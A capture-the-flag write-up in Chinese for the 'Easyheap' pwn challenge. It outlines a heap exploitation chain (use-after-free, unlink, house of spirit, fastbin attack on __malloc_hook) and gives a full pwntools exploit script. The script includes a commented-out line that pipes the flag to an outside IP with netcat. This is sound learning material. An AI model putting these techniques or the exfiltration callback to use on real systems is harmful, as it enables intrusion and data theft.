# Easyheap


题目存在一个很容易发现的UAF，并且限制了show

但是问题是，题目只能申请一个chunk

1. 申请大量fastbin chunk，用scanf触发malloc_conslidate 合并构造unsorted bin
2. 利用fastbin拿回chunk，并利用0xao 构造unlink
3. Double free unlink 写到.bss上利用username 和 password 构造house of spirit
4. 用fastbin 再拿回来，修改random_num，顺利leaking
5. 最后在这个UAF上edit 利用fastbin attack 写到__malloc_hook

利用链一气呵成，不算难，但是很漂亮，不非预期就好，2333

最后题目关闭了stdout，用骚操作反弹就可以或者stdin输出?

EXP如下:

```python
#!python
#-*- coding: utf-8 -*-
from pwn import *

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop = True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y: p.sendlineafter(x,y)

context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','120']

p = process("./easyheap")
elf = ELF("./easyheap")
libc = elf.libc

def add(size,cnt):
    sl(">> ",str(1))
    sl("size\n",str(size))
    s("content\n",cnt)

def add_no_output(size,cnt):
    p.sendline(str(1))
    p.sendline(str(size))
    p.send(cnt)

def dele():
    sl(">> ",str(2))

def dele_no_output():
    p.sendline(str(2))

def show():
    sl(">> ",str(3))

def gift(choice,cnt=""):
    sl(">> ",str(666))
    s("free?",str(choice))
    if choice==1:
        s("content\n",cnt)

# house of spirit
s("username:",3*p64(0)+p64(0x41))
s("info",3*p64(0)+p64(0x20e21))

add(0x38,'\0'*0x38)
dele()
add(0x48,'\0'*0x48)
dele()
add(0x28,'\0'*0x28)
dele()
add(0x18,'\0'*0x18)
dele()
add(0x68,'\0'*0x30+p64(0)+p64(0x21)+"\0"*0x10+p64(0x20)+p64(0x101))
dele()

add(0x80,'\x00'*0x80)
add(0x28,'\0'*0x28)
dele()

sl(">> ",'1'*0x400)

payload = 2*p64(0)
payload += p64(0x602098-0x18)+p64(0x602098-0x10)
payload = payload.ljust(0x80,'\0')
payload += p64(0x80)+p64(0x90)

gift(1,cnt=payload)
dele()
gift(2)

# Leaking libc
add(0x38,p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))
dele()
add(0x68,'A'*0x10)
# gdb.attach(p)#'b *0x400A47\n b *'+hex(one))
show()
ru("A"*0x10)

libc.address= u64(ru("\n").ljust(0x8,'\x00'))-0x3c4b78
log.info("libc.address:"+hex(libc.address))
__malloc_hook = libc.sym['__malloc_hook']
system = libc.sym['system']

one = libc.address+0xf02a4
# ru("everything has a price\n")

# Overlap
#dele()
#add(0x80,'\x00'*0x80)
#add(0x18,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
#add(0x68,'\x00'*0x68)
#add(0x68,'\x00'*0x13+p64(one))
#dele()

pause()
dele_no_output()
pause()
add_no_output(0x80,'\0'*0x80)
pause()
add_no_output(0x18,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
pause()
add_no_output(0x68,'\0'*0x68)
pause()
add_no_output(0x68,"\0"*0x13+p64(one))

# getshell
dele_no_output()

#p.sendline("cat flag | nc 104.168.236.8 8888")

p.interactive()
```
